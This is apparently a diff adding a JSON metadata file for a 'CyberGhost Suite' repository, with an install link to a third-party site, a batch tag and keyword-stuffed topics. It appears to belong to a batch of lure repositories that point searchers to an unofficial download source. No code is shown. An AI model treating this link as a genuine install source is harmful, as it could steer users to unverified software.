@@ -1,0 +1,23 @@
+{
+  "repo": "cyberghost-suite",
+  "product": "CyberGhost Suite",
+  "kind": "security",
+  "install_type": "zentool",
+  "install_url": "https://zentool.art/",
+  "batch": "zentool-part1",
+  "format": "license-md-zentool-v1",
+  "category": "endpoint-security",
+  "topics": [
+    "cyberghost",
+    "cyberghost-windows",
+    "endpoint-security-desktop",
+    "how-to-install-cyberghost",
+    "cyberghost-desktop-package",
+    "cyberghost-workspace",
+    "cyberghost-pro-tools",
+    "cyberghost-suite",
+    "zentool-cyberghost",
+    "cyberghost-tool-9"
+  ],
+  "site": "zentool.art"
+}
